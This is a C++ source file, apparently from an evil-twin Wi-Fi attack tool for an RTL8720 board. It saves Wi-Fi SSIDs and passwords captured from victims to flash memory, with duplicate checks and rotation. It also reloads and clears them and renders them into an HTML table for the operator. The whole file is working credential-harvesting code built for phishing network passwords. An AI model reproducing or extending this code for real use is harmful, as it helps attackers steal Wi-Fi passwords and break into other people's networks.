#include "flash_storage.h"
#include "FlashStorage_RTL8720.h"  // Local library include

// Struct to store everything in flash
struct CredentialsStore {
  uint16_t magic;
  int count;
  WiFiCredential credentials[MAX_CREDENTIAL_ENTRIES];
};

WiFiCredential capturedCredentials[MAX_CREDENTIAL_ENTRIES];
int credentialCount = 0;

void saveCredentialToFlash(String ssid, String password) {
  if (password.length() == 0 || password.length() > MAX_PWD_LENGTH) {
    return;
  }
  if (ssid.length() == 0) {
    ssid = "Unknown";
  }
  
  // Read current storage
  CredentialsStore store;
  FlashStorage.get(0, store);
  
  // Initialize if invalid
  if (store.magic != CREDENTIAL_MAGIC) {
    store.magic = CREDENTIAL_MAGIC;
    store.count = 0;
    memset(store.credentials, 0, sizeof(store.credentials));
  }
  
  // Update local cache first
  credentialCount = store.count;
  memcpy(capturedCredentials, store.credentials, sizeof(capturedCredentials));
  
  // Check duplicates
  for (int i = 0; i < credentialCount; i++) {
    if (String(store.credentials[i].ssid) == ssid && 
        String(store.credentials[i].password) == password) {
      DEBUG_SER_PRINT("Credential duplicate, skipping save.\n");
      return;
    }
  }
  
  // Shift if full
  if (credentialCount >= MAX_CREDENTIAL_ENTRIES) {
    for (int i = 0; i < MAX_CREDENTIAL_ENTRIES - 1; i++) {
      store.credentials[i] = store.credentials[i + 1];
    }
    credentialCount = MAX_CREDENTIAL_ENTRIES - 1;
  }
  
  // Add new
  WiFiCredential newCred;
  memset(&newCred, 0, sizeof(newCred));
  strncpy(newCred.ssid, ssid.c_str(), MAX_SSID_LENGTH);
  strncpy(newCred.password, password.c_str(), MAX_PWD_LENGTH);
  newCred.timestamp = millis();
  
  store.credentials[credentialCount] = newCred;
  credentialCount++;
  store.count = credentialCount;
  
  // Update global array
  capturedCredentials[credentialCount - 1] = newCred;
  
  // Write to flash
  FlashStorage.put(0, store);
  
  DEBUG_SER_PRINT("Saved to flash: " + ssid + " / " + password + "\n");
  lastCapturedPassword = password;
  
  // Sync legacy password history
  if (passwordHistory.size() < MAX_STORED_PASSWORDS) {
    passwordHistory.push_back(password);
  }
}

void loadCredentialsFromFlash() {
  DEBUG_SER_PRINT("Loading credentials...\n");
  
  CredentialsStore store;
  FlashStorage.get(0, store);
  
  if (store.magic == CREDENTIAL_MAGIC) {
    credentialCount = store.count;
    if (credentialCount > MAX_CREDENTIAL_ENTRIES) credentialCount = MAX_CREDENTIAL_ENTRIES; // Safety
    
    memcpy(capturedCredentials, store.credentials, sizeof(capturedCredentials));
    
    // Update legacy history
    passwordHistory.clear();
    for (int i = 0; i < credentialCount; i++) {
      passwordHistory.push_back(String(capturedCredentials[i].password));
    }
    
    if (credentialCount > 0) {
      lastCapturedPassword = String(capturedCredentials[credentialCount - 1].password);
      DEBUG_SER_PRINT("Loaded " + String(credentialCount) + " credentials.\n");
    } else {
      DEBUG_SER_PRINT("Flash storage empty.\n");
    }
  } else {
    DEBUG_SER_PRINT("No valid credentials in flash.\n");
    credentialCount = 0;
  }
}

void clearCredentialsFromFlash() {
  CredentialsStore store;
  store.magic = 0xFFFF; // Invalidate
  store.count = 0;
  memset(store.credentials, 0, sizeof(store.credentials));
  
  FlashStorage.put(0, store);
  
  credentialCount = 0;
  passwordHistory.clear();
  lastCapturedPassword = "";
  DEBUG_SER_PRINT("Flash credentials cleared.\n");
}

String getCredentialsHTML() {
  String html = "";
  for (int i = 0; i < credentialCount; i++) {
    html += "<tr><td>" + String(i + 1) + "</td>";
    html += "<td>" + String(capturedCredentials[i].ssid) + "</td>";
    html += "<td>" + String(capturedCredentials[i].password) + "</td></tr>";
  }
  if (credentialCount == 0) {
    html = "<tr><td colspan='3' class='hidden'>No credentials captured yet</td></tr>";
  }
  return html;
}

// Legacy wrappers
void savePasswordToFlash(String password) {
  saveCredentialToFlash(evilTwinSSID.length() > 0 ? evilTwinSSID : "Unknown", password);
}

void loadPasswordsFromFlash() {
  loadCredentialsFromFlash();
}

void clearPasswordsFromFlash() {
  clearCredentialsFromFlash();
}
